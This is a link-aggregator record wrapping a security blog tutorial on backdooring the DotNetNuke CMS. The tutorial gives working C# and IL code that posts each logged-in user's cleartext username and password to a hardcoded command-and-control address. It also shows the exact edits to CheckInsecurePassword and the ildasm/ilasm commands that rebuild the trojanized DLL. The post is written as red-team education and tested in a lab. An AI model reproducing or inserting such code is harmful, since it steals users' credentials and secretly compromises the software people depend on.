{"aid": "40095415", "title": "Backdooring Dotnet Applications", "url": "https://starkeblog.com/backdooring/dotnet/2024/04/19/backdooring-dotnet-applications.html", "domain": "starkeblog.com", "votes": 1, "user": "skilled", "posted_at": "2024-04-20 06:56:36", "comments": 0, "source_title": "StarkeBlog - Backdooring Dotnet Applications", "source_text": "StarkeBlog - Backdooring Dotnet Applications\n\n# StarkeBlog\n\nFirmware and Hacking\n\nProject run by Nicholas Starke Music I have written\n\n19 April 2024\n\n# Backdooring Dotnet Applications\n\n## tl;dr\n\nThis blog post presents a very manual approach to modifying application code.\nIf you don\u2019t have time to read and learn, I direct you to: DnSpyEx. Happy\nHacking!\n\n## Background\n\nIn my previous blog post I went through the tooling required for reverse\nengineering dotnet applications. I recommend reading through that blog post\nbefore tackling this one, especially if you are unfamiliar with ilasm and\nildasm.\n\n## Introduction\n\nToday we are going to look at how to backdoor a dotnet application. Let\u2019s\ndefine what that means. We want to introduce new functionality into an\nexisting dotnet application or dll without any application errors.\n\nTo accomplish this goal, I chose an open source dotnet application to use as a\ndemonstration. I chose DNN (https://github.com/dnnsoftware/Dnn.Platform),\nwhich is an open source Content Management System built in dotnet. As an open\nsource project, the application code is available for all to read and modify.\nHowever, the techniques I am going to teach you here do not rely at all on\nhaving the source code; the only prerequisite is having access to the binary\napplication/dll, the ability to swap out the dll on the webserver, and the\nability to restart IIS.\n\nWhat is the functionality we intend to introduce? Well as good attackers, we\nwant something useful for us to advance against our objectives. For this\ndemonstration, I chose introducing the capability of sending the valid login\ncredentials of every authenticated user to a remote server via HTTP. I plugged\nthis function into the application binary instructions responsible for\nhandling successful authentication attempts.\n\nWhy chose this functionality? Passwords in CMS systems, as well as most well-\nconstructed dotnet applications, are stored after being passed through a one\nway hash function. That way if an attacker is able to pop the database, they\naren\u2019t able to recover the password directly. But, if we can capture the\ncredentials as they move through memory, before they touch disk, we can pilfer\nthe unhashed clear text credentials. Recovering application credentials can be\nvery useful for gaining further access due to password reuse.\n\n## Test Environment\n\nWhen trying to modify binary applications without source code, it is always\nvery important to have a reliable test environment. I have a VM with a\nlicensed version of Windows 11 in it that I use for tasks like this. I\ndownloaded version 9.13.3 of DNN from\nhttps://github.com/dnnsoftware/Dnn.Platform/releases/tag/v9.13.3. 9.13.3 is\nthe latest version as of this writing.\n\nI unzipped the release zip file into C:\\DNN9. I also had to install SQLExpress\nand SQL Server Management Studio (SSMS) and modify the web.config file in\nC:\\DNN9 to point to my local SQLExpress SQL Server Database instead of relying\non the Database.mdf file located in C:\\DNN9\\App_data. I used SSMS to query the\nExceptions table in the DnnDB to troubleshoot application errors I received\nwhile debugging my backdoor. DNN does not display error messages with stack\ntraces to web users upon exception; it logs them into this table for\npersistence.\n\nThe specific configuration setup is not relevent to this blog post, but good\ninstructions to get started can be found here:\nhttps://www.dnnsoftware.com/docs/developers/setup/index.html\n\n## Creating the Backdoor Code/Instructions\n\nTo add functionality to an application in binary form requires manipulating\nthe binary disassembly directly, then reassembling the modified disassembly\nback into pure binary .NET CLR bytecode. This requires us to inject the code\nwe hope to modify the original application with into the disassembly. Instead\nof trying to hand write large amounts of disassembly by hand, I usually start\nby creating a Windows C# .NET Console Application in Visual Studio. From\nthere, I write a function that takes as argument the data I wish to exfiltrate\nto a remote server, and then call that function from the main function passing\nin hardcoded variables to the function invocation.\n\nThe source code for my CustomFunction and Console Application:\n\n    \n    \n    using Newtonsoft.Json; using System; using System.Collections.Generic; using System.Collections.Specialized; using System.Linq; using System.Net; using System.Net.Http; using System.Security.Policy; using System.Text; using System.Threading.Tasks; namespace DnnReConsoleApp { internal class Program { static void Main(string[] args) { string username = \"bogus\"; string password = \"bogus2\"; CustomFunction(username, password); } static void CustomFunction(string username, string password) { using (var wb = new WebClient()) { var data = new NameValueCollection(); data[\"username\"] = username; data[\"password\"] = password; var response = wb.UploadValues(\"http://192.168.50.114:3000/creds\", \"POST\", data); string responseInString = Encoding.UTF8.GetString(response); } } } }\n\nI compile this application and then disassemble it with ildasm by running:\n\n    \n    \n    ildasm /out=DnnReConsoleApp.il DnnReConsoleApp.exe\n\nWhich produces the following bytecode disassembly:\n\n    \n    \n    // Microsoft (R) .NET Framework IL Disassembler. Version 4.8.3928.0 // Copyright (c) Microsoft Corporation. All rights reserved. // Metadata version: v4.0.30319 .assembly extern mscorlib { .publickeytoken = (B7 7A 5C 56 19 34 E0 89 ) // .z\\V.4.. .ver 4:0:0:0 } .assembly extern System { .publickeytoken = (B7 7A 5C 56 19 34 E0 89 ) // .z\\V.4.. .ver 4:0:0:0 } .assembly DnnReConsoleApp { .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78 // ....T..WrapNonEx 63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 ) // ceptionThrows. // --- The following custom attribute is added automatically, do not uncomment ------- // .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 0F 44 6E 6E 52 65 43 6F 6E 73 6F 6C 65 41 // ...DnnReConsoleA 70 70 00 00 ) // pp.. .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) .custom instance void [mscorlib]System.Reflection.AssemblyConfigurationAttribute::.ctor(string) = ( 01 00 00 00 00 ) .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 0F 44 6E 6E 52 65 43 6F 6E 73 6F 6C 65 41 // ...DnnReConsoleA 70 70 00 00 ) // pp.. .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 12 43 6F 70 79 72 69 67 68 74 20 C2 A9 20 // ...Copyright .. 20 32 30 32 34 00 00 ) // 2024.. .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 33 32 32 30 36 39 65 33 2D 62 36 33 62 // ..$322069e3-b63b 2D 34 65 32 39 2D 61 64 32 65 2D 33 35 33 31 34 // -4e29-ad2e-35314 33 63 64 38 31 38 61 00 00 ) // 3cd818a.. .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 ) // ...1.0.0.0.. .custom instance void [mscorlib]System.Runtime.Versioning.TargetFrameworkAttribute::.ctor(string) = ( 01 00 1A 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B // ....NETFramework 2C 56 65 72 73 69 6F 6E 3D 76 34 2E 38 01 00 54 // ,Version=v4.8..T 0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73 70 6C // ..FrameworkDispl 61 79 4E 61 6D 65 12 2E 4E 45 54 20 46 72 61 6D // ayName..NET Fram 65 77 6F 72 6B 20 34 2E 38 ) // ework 4.8 .hash algorithm 0x00008004 .ver 1:0:0:0 } .module DnnReConsoleApp.exe // MVID: {7472C02C-0AE8-4CA6-A7A8-49F6F0936D7F} .imagebase 0x00400000 .file alignment 0x00000200 .stackreserve 0x00100000 .subsystem 0x0003 // WINDOWS_CUI .corflags 0x00020003 // ILONLY 32BITPREFERRED // Image base: 0x06DB0000 // =============== CLASS MEMBERS DECLARATION =================== .class private auto ansi beforefieldinit DnnReConsoleApp.Program extends [mscorlib]System.Object { .method private hidebysig static void Main(string[] args) cil managed { .entrypoint // Code size 22 (0x16) .maxstack 2 .locals init ([0] string username, [1] string password) IL_0000: nop IL_0001: ldstr \"bogus\" IL_0006: stloc.0 IL_0007: ldstr \"bogus2\" IL_000c: stloc.1 IL_000d: ldloc.0 IL_000e: ldloc.1 IL_000f: call void DnnReConsoleApp.Program::CustomFunction(string, string) IL_0014: nop IL_0015: ret } // end of method Program::Main .method private hidebysig static void CustomFunction(string username, string password) cil managed { // Code size 85 (0x55) .maxstack 4 .locals init ([0] class [System]System.Net.WebClient wb, [1] class [System]System.Collections.Specialized.NameValueCollection data, [2] uint8[] response, [3] string responseInString) IL_0000: nop IL_0001: newobj instance void [System]System.Net.WebClient::.ctor() IL_0006: stloc.0 .try { IL_0007: nop IL_0008: newobj instance void [System]System.Collections.Specialized.NameValueCollection::.ctor() IL_000d: stloc.1 IL_000e: ldloc.1 IL_000f: ldstr \"username\" IL_0014: ldarg.0 IL_0015: callvirt instance void [System]System.Collections.Specialized.NameValueCollection::set_Item(string, string) IL_001a: nop IL_001b: ldloc.1 IL_001c: ldstr \"password\" IL_0021: ldarg.1 IL_0022: callvirt instance void [System]System.Collections.Specialized.NameValueCollection::set_Item(string, string) IL_0027: nop IL_0028: ldloc.0 IL_0029: ldstr \"http://192.168.50.114:3000/creds\" IL_002e: ldstr \"POST\" IL_0033: ldloc.1 IL_0034: callvirt instance uint8[] [System]System.Net.WebClient::UploadValues(string, string, class [System]System.Collections.Specialized.NameValueCollection) IL_0039: stloc.2 IL_003a: call class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8() IL_003f: ldloc.2 IL_0040: callvirt instance string [mscorlib]System.Text.Encoding::GetString(uint8[]) IL_0045: stloc.3 IL_0046: nop IL_0047: leave.s IL_0054 } // end .try finally { IL_0049: ldloc.0 IL_004a: brfalse.s IL_0053 IL_004c: ldloc.0 IL_004d: callvirt instance void [mscorlib]System.IDisposable::Dispose() IL_0052: nop IL_0053: endfinally } // end handler IL_0054: ret } // end of method Program::CustomFunction .method public hidebysig specialname rtspecialname instance void .ctor() cil managed { // Code size 8 (0x8) .maxstack 8 IL_0000: ldarg.0 IL_0001: call instance void [mscorlib]System.Object::.ctor() IL_0006: nop IL_0007: ret } // end of method Program::.ctor } // end of class DnnReConsoleApp.Program // ============================================================= // *********** DISASSEMBLY COMPLETE *********************** // WARNING: Created Win32 resource file DnnReConsoleApp.res\n\nA few things to note about this program:\n\n1) To avoid having to drop additional dll libraries onto the target website, I\nchose to use the Newtonsoft.Json JSON library as it was already included in\nDNN by default.\n\n2) The application makes a HTTP POST request containing the login credentials\nto a hardcoded IP address running elsewhere as our remote capture server (c2).\n\n## Identifying the insertion point\n\nWe need to find the right location in our target application to insert the\ncustom functionality as well as where to call our CustomFunction from. There\nare a lot of .NET Decompilers out there; the last blog post used ILSpy (also\nopen source and available on the Microsoft Store). For this blog post I am\ngoing to use Dotpeek. There are many others; I encourage you to try as many of\nthem as you can to decide which fits your work flow best.\n\nI was able to identify the code location I wanted to call my CustomFunction\nfrom by using DotPeek to peruse the binary dll file.\n\nThe CheckInsecurePassword method is located in the DotNetNuke.dll file. In C#\nterms, it lives in the namespace DotNetNuke.Entities.Users.UserController.\n\nI chose the end of the CheckInsecurePassword function to insert the method\ninvocation to my CustomFunction for a few reaqsons:\n\n1) This method does not return a value (return type void in C#)\n\n2) It is called on every successful authentication check as far as I can tell.\n\n3) It has the data I want to steal as argument parameters.\n\n## Disassembling the Original DLL\n\nI used the following command to disassemble DotNetNuke.dll:\n\n    \n    \n    ildasm /dll /out=DotNetNuke.il DotNetNuke.dll\n\nAn important thing to note is that ildasm creates a DotNetNuke.res file upon\nsuccessful disassembly. This file will become very important later.\n\nNow that we have our disassembly, we can begin modifying the disassembly to\ninclude both our CustomFunction and the invocation of it.\n\n## Modifying the Disassembly\n\nThe Disassembly for the DotNetNuke.dll is 600,000+ lines long, so I won\u2019t\ninclude it in its entirety here. If you\u2019re interested, I posted a copy of the\nmodified Disassembly file here. For this blog post, I will focus on the\ninsertion point for the CustomFunction method and the insertion point for\ncalling this custom function.\n\nFor the first, I chose to include the function in\nDotNetNuke.Entities.Users.UserController. You can find this class by searching\nfor this string in DotNetNuke.il:\n\n    \n    \n    .class public auto ansi beforefieldinit DotNetNuke.Entities.Users.UserController\n\nI identified the class by using this VSCode Search Term (with regex enabled):\n\n    \n    \n    \\.class.*DotNetNuke.Entities.Users.UserController\n\nI inserted the disassembled method right after\nUserController::GetDuplicateEmailCount. You can find this location by\nsearching for the following string:\n\n    \n    \n    } // end of method UserController::GetDuplicateEmailCount\n\nI changed the method signature to\n\n    \n    \n    .method public hidebysig static void\n\nFrom:\n\n    \n    \n    .method private hidebysig static void\n\nSo I could call the CustomFunction externally if necessary. It ended up not\nbeing necessary to pull the full attack off, but its something to consider if\nyou\u2019re making calls to other assemblies.\n\nThat takes care of inserting the CustomFunction method. How about calling it\nnow?\n\nI wanted to add the invocation at the end of the function, so I chose to add\nit after the disassembly would normally end:\n\n    \n    \n    IL_004f: brfalse.s IL_0054 IL_0051: ldarg.2 IL_0052: ldc.i4.6 IL_0053: stind.i4 IL_0054: ret\n\nI added this handwritten disassembly:\n\n    \n    \n    IL_0054: ldarg.0 IL_0055: ldarg.1 IL_0056: call void DotNetNuke.Entities.Users.UserController::CustomFunction(string, string) IL_005A: nop IL_005b: ret\n\nNote that the ret bytecode instruction had to be modified from IL_0054: ret to\nIL_005b: ret\n\n## Reassembling\n\nAfter we insert our method and invocation, we need to reassemble our\nDotNetNuke.dll from the modified DotNetNuke.il. We can do that by running the\nfollowing command:\n\n    \n    \n    ilasm /dll /out=DotNetNuke.dll /resource=DotNetNuke.res DotNetNuke.il\n\nThis is where that resource file comes in. On disassembly, ildasm creates a\n.res file containing Assembly version information and other metadata. DNN uses\nthe data in this file in its start up code, and if it doesn\u2019t exist you will\nbe granted with an ASP.NET Runtime Error if you don\u2019t include it when\nreassembling. That might be specific to DNN but it will probably also matter\nfor whatever dll/exe you are targeting.\n\n## Setting up the C2\n\nI went out to another host on my network that runs an ubuntu image and\ndownloaded this python3 script:\n\nhttps://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7\n\nI ran this script on port 3000. Note that the IP Address in this case of my\n\u201cc2\u201d was 192.168.50.114 which corresponds to the URL for the web request in\nCustomFunction.\n\n## Does it work?\n\nI access my local installation of DNN using a web browser, and I log in using\nmy authentication credentials. This is what I see on my C2 output:\n\nSuccess!\n\nHome\n\n", "frontpage": false}
